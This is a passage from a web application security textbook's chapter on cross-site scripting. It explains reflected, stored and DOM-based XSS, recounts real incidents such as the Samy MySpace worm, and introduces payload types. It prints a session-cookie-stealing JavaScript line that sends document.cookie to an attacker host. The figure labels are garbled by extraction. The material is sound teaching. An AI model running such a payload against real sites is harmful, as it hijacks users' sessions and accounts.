Chapter 12 n Attacking Users: Cross-Site Scripting 437
4. The server responds to the user’s request. As a result of the XSS vulner-
ability, the response contains the JavaScript the attacker created.
5. The user’s browser receives the attacker’s JavaScript and executes it in the
same way it does any other code it receives from the application.
6. The malicious JavaScript created by the attacker is:
var i=new Image; i.src=”http://mdattacker.net/”+document.cookie;
This code causes the user’s browser to make a request to mdattacker.net
which is a domain owned by the attacker. The request contains the user’s
current session token for the application:
GET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
Host: mdattacker.net
7. The attacker monitors requests to mdattacker.net and receives the user’s
request. He uses the captured token to hijack the user’s session, gaining
access to that user’s personal information and performing arbitrary actions
“as” the user.
NOTE As you saw in Chapter 6, some applications store a persistent cookie
that effectively reauthenticates the user on each visit, such as to implement a
“remember me” function. In this situation, step 1 of the preceding process is
unnecessary. The attack will succeed even when the target user is not actively
logged in to or using the application. Because of this, applications that use
cookies in this way leave themselves more exposed in terms of the impact of
any XSS fl aws they contain.
After reading all this, you may be forgiven for wondering why, if the attacker
can induce the user to visit a URL of his choosing, he bothers with the rigma-
role of transmitting his malicious JavaScript via the XSS bug in the vulnerable
application. Why doesn’t he simply host a malicious script on mdattacker.net
and feed the user a direct link to this script? Wouldn’t this script execute in the
same way as it does in the example described?
To understand why the attacker needs to exploit the XSS vulnerability, recall
the same-origin policy that was described in Chapter 3. Browsers segregate
content that is received from different origins (domains) in an attempt to prevent
different domains from interfering with each other within a user’s browser.
The attacker’s objective is not simply to execute an arbitrary script but to cap-
ture the user’s session token. Browsers do not let just any old script access a
domain’s cookies; otherwise, session hijacking would be easy. Rather, cookies
can be accessed only by the domain that issued them. They are submitted in
HTTP requests back to the issuing domain only, and they can be accessed via
cc1122..iinndddd 443377 88//1199//22001111 1122::1122::2266 PPMM
Stuttard c12.indd V2 - 08/10/2011 Page 438
438 Chapter 12 n Attacking Users: Cross-Site Scripting
JavaScript contained within or loaded by a page returned by that domain only.
Hence, if a script residing on mdattacker.net queries document.cookie, it will
not obtain the cookies issued by mdsec.net, and the hijacking attack will fail.
The reason why the attack that exploits the XSS vulnerability is successful is
that, as far as the user’s browser is concerned, the attacker’s malicious JavaScript
was sent to it by mdsec.net. When the user requests the attacker’s URL, the
browser makes a request to http://mdsec.net/error/5/Error.ashx , and the
application returns a page containing some JavaScript. As with any JavaScript
received from mdsec.net, the browser executes this script within the security
context of the user’s relationship with mdsec.net. This is why the attacker’s
script, although it actually originates elsewhere, can gain access to the cook-
ies issued by mdsec.net. This is also why the vulnerability itself has become
known as cross-sitescripting.
Stored XSS Vulnerabilities
A different category of XSS vulnerability is often called stored cross-site scripting.
This version arises when data submitted by one user is stored in the application
(typically in a back-end database) and then is displayed to other users without
being fi ltered or sanitized appropriately.
Stored XSS vulnerabilities are common in applications that support interac-
tion between end users, or where administrative staff access user records and
data within the same application. For example, consider an auction application
that allows buyers to post questions about specifi c items and sellers to post
responses. If a user can post a question containing embedded JavaScript, and
the application does not fi lter or sanitize this, an attacker can post a crafted
question that causes arbitrary scripts to execute within the browser of anyone
who views the question, including both the seller and other potential buyers.
In this context, the attacker could potentially cause unwitting users to bid on
an item without intending to, or cause a seller to close an auction and accept
the attacker’s low bid for an item.
Attacks against stored XSS vulnerabilities typically involve at least two requests
to the application. In the fi rst, the attacker posts some crafted data containing
malicious code that the application stores. In the second, a victim views a page
containing the attacker’s data, and the malicious code is executed when the
script is executed in the victim’s browser. For this reason, the vulnerability is
also sometimes called second-order cross-site scripting. (In this instance, “XSS”
is really a misnomer, because the attack has no cross-site element. The name is
widely used, however, so we will retain it here.)
Figure 12-4 illustrates how an attacker can exploit a stored XSS vulnerability
to perform the same session hijacking attack as was described for refl ected XSS.
cc1122..iinndddd 443388 88//1199//22001111 1122::1122::2277 PPMM
Stuttard c12.indd V2 - 08/10/2011 Page 439
Chapter 12 n Attacking Users: Cross-Site Scripting 439
Application
Us2. U vs 4e .r wl Sso erg aa tts tt ei aa rn c rk kee er rs’ ’ps o Jq n au d ve s sti Swi co t rn ih pt 7. Attc ao cn keta r1 i n. h iA in jat gt ca kmc sk a e ulir sc es io ru ’ub m ei at ss
e r i e v s a ss J v aq ioSu nce rs it pio tn
c s
3.
s
5. Attacker’s
JavaScript
executes in
6. User’s browser sends session token to attacker
user’s browser
User Attacker
Figure 12-4: The steps involved in a stored XSS attack
TRY IT!
This example contains a search function that displays the query that the
current user enters, and also a list of recent queries by other users. Because
queries are displayed unmodifi ed, the application is vulnerable to both
refl ected and stored XSS. See if you can fi nd both vulnerabilities.
http://mdsec.net/search/11/
Refl ected and stored XSS have two important differences in the attack process.
Stored XSS generally is more serious from a security perspective.
First, in the case of refl ected XSS, to exploit a vulnerability, the attacker must
induce victims to visit his crafted URL. In the case of stored XSS, this require-
ment is avoided. Having deployed his attack within the application, the attacker
simply needs to wait for victims to browse to the page or function that has been
compromised. Usually this is a regular page of the application that normal users
will access of their own accord.
Second, the attacker’s objectives in exploiting an XSS bug are usually achieved
much more easily if the victim is using the application at the time of the attack.
For example, if the user has an existing session, this can be immediately hijacked.
In a refl ected XSS attack, the attacker may try to engineer this situation by
persuading the user to log in and then click a link that he supplies. Or he may
attempt to deploy a persistent payload that waits until the user logs in. However,
cc1122..iinndddd 443399 88//1199//22001111 1122::1122::2277 PPMM
Stuttard c12.indd V2 - 08/10/2011 Page 440
440 Chapter 12 n Attacking Users: Cross-Site Scripting
in a stored XSS attack, it is usually guaranteed that victim users will already
be accessing the application at the time the attack strikes. Because the attack
payload is stored within a page of the application that users access of their own
accord, any victim of the attack will by defi nition be using the application at
the moment the payload executes. Furthermore, if the page concerned is within
the authenticated area of the application, any victim of the attack must also be
logged in at the time.
These differences between refl ected and stored XSS mean that stored XSS
fl aws are often critical to an application’s security. In most cases, an attacker can
submit some crafted data to the application and then wait for victims to be hit.
If one of those victims is an administrator, the attacker will have compromised
the entire application.
DOM-Based XSS Vulnerabilities
Both refl ected and stored XSS vulnerabilities involve a specifi c pattern of behavior,
in which the application takes user-controllable data and displays this back to
users in an unsafe way. A third category of XSS vulnerabilities does not share
this characteristic. Here, the process by which the attacker’s JavaScript gets
executed is as follows:
n A user requests a crafted URL supplied by the attacker and containing
embedded JavaScript.
n The server’s response does not contain the attacker’s script in any form.
n When the user’s browser processes this response, the script is executed
nonetheless.
How can this series of events occur? The answer is that client-side JavaScript
can access the browser’s document object model (DOM) and therefore can deter-
mine the URL used to load the current page. A script issued by the application
may extract data from the URL, perform some processing on this data, and then
use it to dynamically update the page’s contents. When an application does this,
it may be vulnerable to DOM-based XSS.
Recall the original example of a refl ected XSS fl aw, in which the server-side
application copies data from a URL parameter into an error message. A differ-
ent way of implementing the same functionality would be for the application to
return the same piece of static HTML on every occasion and to use client-side
JavaScript to dynamically generate the message’s contents.
For example, suppose that the error page returned by the application contains
the following:
This script parses the URL to extract the value of the message parameter and
simply writes this value into the page’s HTML source code. When invoked as the
developers intended, it can be used in the same way as in the original example
to create error messages easily. However, if an attacker crafts a URL containing
JavaScript code as the value of the message parameter, this code will be dynami-
cally written into the page and executed in the same way as if the server had
returned it. In this example, the same URL that exploited the original refl ected
XSS vulnerability can also be used to produce a dialog box:
http://mdsec.net/error/18/Error.ashx?message=
TRY IT!
http://mdsec.net/error/18/
Figure 12-5 illustrates the process of exploiting a DOM-based XSS
vulnerability.
Application
etR dhL 7. Attacker
U1 s. erU rs 4e .e r q oSl u neo e trsg its s nri an nrt e gt sa hpc ak o re n dr -’ d cs s oU w di Jp aa vg ae Script hijacks user’s
av e session
3. i
c
5. Attacker’s
URL is processed 2. Attacker feeds crafted URL to user
by JavaScript,
6. User’s browser sends session token to attacker
triggering his
attack payload User Attacker
Figure 12-5: The steps involved in a DOM-based XSS attack
cc1122..iinndddd 444411 88//1199//22001111 1122::1122::2277 PPMM
Stuttard c12.indd V2 - 08/10/2011 Page 442
442 Chapter 12 n Attacking Users: Cross-Site Scripting
DOM-based XSS vulnerabilities are more similar to refl ected XSS bugs than
to stored XSS bugs. Their exploitation typically involves an attacker’s inducing
a user to access a crafted URL containing malicious code. The server’s response
to that specifi c request causes the malicious code to be executed. However,
in terms of the exploitation details, there are important differences between
refl ected and DOM-based XSS, which we will examine shortly.
XSS Attacks in Action
To understand the serious impact of XSS vulnerabilities, it is fruitful to examine
some real-world examples of XSS attacks. It also helps to consider the wide range
of malicious actions that XSS exploits can perform and how they are actively
being delivered to victims.
Real-World XSS Attacks
In 2010, the Apache Foundation was compromised via a refl ected XSS attack
within its issue-tracking application. An attacker posted a link, obscured using
a redirector service, to a URL that exploited the XSS fl aw to capture the session
token of the logged-in user. When an administrator clicked the link, his ses-
sion was compromised, and the attacker gained administrative access to the
application. The attacker then modifi ed a project’s settings to change the upload
folder for the project to an executable directory within the application’s web
root. He uploaded a Trojan login form to this folder and was able to capture
the usernames and passwords of privileged users. The attacker identifi ed some
passwords that were being reused on other systems within the infrastructure.
He was able to fully compromise those other systems, escalating the attack
beyond the vulnerable web application.
For more details on this attack, see this URL:
http://blogs.apache.org/infra/entry/apache_org_04_09_2010
In 2005, the social networking site MySpace was found to be vulnerable to a
stored XSS attack. The MySpace application implements fi lters to prevent users
from placing JavaScript into their user profi le page. However, a user called Samy
found a means of circumventing these fi lters and placed some JavaScript into
his profi le page. The script executed whenever a user viewed this profi le and
caused the victim’s browser to perform various actions with two key effects.
First, the browser added Samy as a “friend” of the victim. Second, it copied the
script into the victim’s own user profi le page. Subsequently, anyone who viewed
the victim’s profi le would also fall victim to the attack. The result was an XSS-
based worm that spread exponentially. Within hours the original perpetrator
cc1122..iinndddd 444422 88//1199//22001111 1122::1122::2277 PPMM
Stuttard c12.indd V2 - 08/10/2011 Page 443
Chapter 12 n Attacking Users: Cross-Site Scripting 443
had nearly one million friend requests. As a result, MySpace had to take the
application offl ine, remove the malicious script from the profi les of all its users,
and fi x the defect in its anti-XSS fi lters.
For more details on this attack, see this URL:
http://namb.la/popular/tech.html
Web mail applications are inherently at risk of stored XSS attacks because
of how they render e-mail messages in-browser when viewed by the recipient.
E-mails may contain HTML-formatted content, so the application effectively
copies third-party HTML into the pages it displays to users. In 2009, a web mail
provider called StrongWebmail offered a $10,000 reward to anyone who could
break into the CEO’s e-mail. Hackers identifi ed a stored XSS vulnerability within
the web mail application that allowed arbitrary JavaScript to be executed when
the recipient viewed a malicious e-mail. They sent a suitable e-mail to the CEO,
compromised his session on the application, and claimed the reward.
For more details on this attack, see this URL:
http://blogs.zdnet.com/security/?p=3514
In 2009, Twitter fell victim to two XSS worms that exploited stored XSS vulner-
abilities to spread between users and post updates promoting the website of the
worms’ author. Various DOM-based XSS vulnerabilities have also been identi-
fi ed in Twitter, arising from its extensive use of Ajax-like code on the client side.
For more details on these vulnerabilities, see the following URLs:
www.cgisecurity.com/2009/04/two-xss-worms-slam-twitter.html
http://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-and-
something.html
Payloads for XSS Attacks
So far, we have focused on the classic XSS attack payload. It involves capturing
a victim’s session token, hijacking her session, and thereby making use of the
application “as” the victim, performing arbitrary actions and potentially taking
ownership of that user’s account. In fact, numerous other attack payloads may
be delivered via any type of XSS vulnerability.
Virtual Defacement
This attack involves injecting malicious data into a page of a web application to
feed misleading information to users of the application. It may simply involve
injecting HTML markup into the site, or it may use scripts (sometimes hosted
on an external server) to inject elaborate content and navigation into the site.
cc1122..iinndddd 444433 88//1199//22001111 1122::1122::2277 PPMM
Stuttard c12.indd V2 - 08/10/2011 Page 444
444 Chapter 12 n Attacking Users: Cross-Site Scripting
This kind of attack is known as virtualdefacement because the actual content
hosted on the target’s web server is not modifi ed. The defacement is generated
solely because of how the application processes and renders user-supplied input.
In addition to frivolous mischief, this kind of attack could be used for seri-
ous criminal purposes. A professionally crafted defacement, delivered to the
right recipients in a convincing manner, could be picked up by the news media
and have real-world effects on people’s behavior, stock prices, and so on, to the
attacker’s fi nancial benefi t, as illustrated in Figure 12-6.
Figure 12-6: A virtual defacement attack exploiting an XSS flaw
Injecting Trojan Functionality
This attack goes beyond virtual defacement and injects actual working func-
tionality into the vulnerable application. The intent is to deceive end users into
performing some undesirable action, such as entering sensitive data that is then
transmitted to the attacker.
As was described in the attack against Apache, an obvious attack involving
injected functionality is to present users with a Trojan login form that submits
their credentials to a server controlled by the attacker. If skillfully executed,
the attack may also seamlessly log in the user to the real application so that she
does not detect any anomaly in her experience. The attacker is then free to use
the victim’s credentials for his own purposes. This type of payload lends itself
well to a phishing-style attack, in which users are fed a crafted URL within the
actual authentic application and are advised that they need to log in as normal
to access it.
Another obvious attack is to ask users to enter their credit card details, usually
with the inducement of some attractive offer. For example, Figure 12-7 shows a
proof-of-concept attack created by Jim Ley, exploiting a refl ected XSS vulner-
ability found in Google in 2004.